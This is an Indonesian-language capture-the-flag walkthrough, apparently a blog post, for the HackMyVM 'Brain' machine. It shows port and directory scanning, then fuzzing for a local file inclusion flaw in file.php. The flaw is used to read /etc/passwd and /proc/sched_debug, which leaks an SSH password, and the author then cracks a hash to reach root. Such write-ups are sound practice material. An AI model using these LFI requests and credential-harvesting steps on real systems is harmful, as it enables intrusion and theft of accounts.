---
layout: Post
title: HackMyVM - Brain Writeup
date: 2021-10-14 08:55 WIB  
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/brain.zip">Brain</a>
  <br>
</h1>

<h4 align="center"> Author: <a href="https://twitter.com/d4t4s3c">d4t4s3c</a></h4>

## NMAP

Oke seperti biasa pertama yang kita lakukan ialan scan port yang ada di dalam vm tersebut dengan `nmap` :

```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10477]
└─[$] nmap -A 192.168.0.5                                                                                                   
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-14 08:43 WIB
Nmap scan report for 192.168.0.5
Host is up (0.00064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da (RSA)
|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 (ECDSA)
|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

## Scan Directory

Next setelah kita tahu adanya port 80, kita scan directory apa saja yang ada di web tersebut dengan `gobuster` :

```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10491]
└─[$] gobuster dir -u http://192.168.0.5/  -x php,html,js,txt -w /opt/wordlist/medium.txt

===============================================================
2021/10/14 08:42:50 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/brainstorm (Status: 301)
/server-status (Status: 403)
===============================================================
2021/10/14 08:50:07 Finished
===============================================================
```

Setelah di scan disini ku scan lagi diretory brainstorm karena masih menyimpan secuil informasi yang berguna buat saya :

```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10478]
└─[$] gobuster dir -u http://192.168.0.5/brainstorm  -x php,html,js,txt -w /opt/wordlist/medium.txt 

===============================================================
2021/10/14 08:44:48 Starting gobuster
===============================================================
/index.html (Status: 200)
/file.php (Status: 200)
===============================================================
2021/10/14 08:51:57 Finished
===============================================================
```

Dan benar saya terdapat `file.php` yang dimana berpotensi terdapat vuln `LFI`. Oleh karena itu ku coba wfuzz untuk mendapatkan parameter tersebut :

```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10493]
└─[$] wfuzz -w /opt/wordlist/medium.txt --hh 0  'http://192.168.0.5/brainstorm/file.php?FUZZ=/etc/passwd'  

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000759:   200        26 L     38 W       1401 Ch     "file"                                                               
```

Yap, ternyata terdapat paramater file, next ku coba lfi ke `/etc/passwd` ternyata terdapat user salomon :

```console
salomon:x:1000:1000:salomon,,,:/home/salomon:/bin/bash
```

Next selanjutnya ku `wfuzz` lagi untuk mencari tahu di parameter tersebut apa saja yang bisa di lihat :

```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10495]
└─[$] wget wget https://raw.githubusercontent.com/tutorial0/payloads/master/lfi.txt                                      
```
```console
┌─[root@lehzo] - [~/Kiyo/HackMyVM/Brain] - [10495]
└─[$] wfuzz -w lfi.txt   --hh 0  'http://192.168.0.5/brainstorm/file.php?file=FUZZ' 

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000001:   200        158 L    1214 W     12494 Ch    "/proc/sched_debug"                                                  
```

Karena itu ku cek `/proc/sched_debug`. Oya sebelumnya file yang bisa dilihat oleh parameter tersbut banyak tapi ku ambil yang penting aja :

```console
Ssalomon:My*****   410      3010.149453        16   120         0.000000         2.419489         0.000000 0 0 /
```

Dan ternyata terdapat password SSH , akhirnya lu login dan terdapat flag `user.txt` :

```console
salomon@Brain:~$ cat user.txt 
onS6lJ*******wZu3I8HKY8sQ
```

Next setelah itu ku coba `ss -tlpn`, ternyata ada port aneh 65000. Pas ku run ternyata menampilkan hasil dari index.htmlnya :

```console
salomon@Brain:~$ ss -tlpn
State            Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port           
LISTEN           0                 128                                0.0.0.0:22                               0.0.0.0:*              
LISTEN           0                 5                                127.0.0.1:65000                            0.0.0.0:*              
LISTEN           0                 128                                      *:80                                     *:*              
LISTEN           0                 128                                   [::]:22                                  [::]:*             
```
```console
salomon@Brain:~$ telnet 127.0.0.1 65000
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
tes
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('tes').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>
Connection closed by foreign host.
```

Oleh karena itu ku coba wget dan ternyata terdapat sebuah hash. Disini ku gatau hashnya apa akhirnya ku coba crack ke `crackstation` :
```console
Hash : 065BB0B9A0C654E5B3B6292C4698BD67CE6A331209D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6A5626E0CB7521641D742251F5A*****
Type : SHA512   
Password : ge****
```

And boom setelah ku su akhirnya mendapatan flag root.txt nya :

```console
salomon@Brain:~$ su
Contraseña: 
root@Brain:/home/salomon# cd
root@Brain:~# ls
index.html  root.txt  run_server.sh  server.py
root@Brain:~# cat root.txt 
gmC9GR0EM*****8zCx3baoUWM
root@Brain:~# 
```
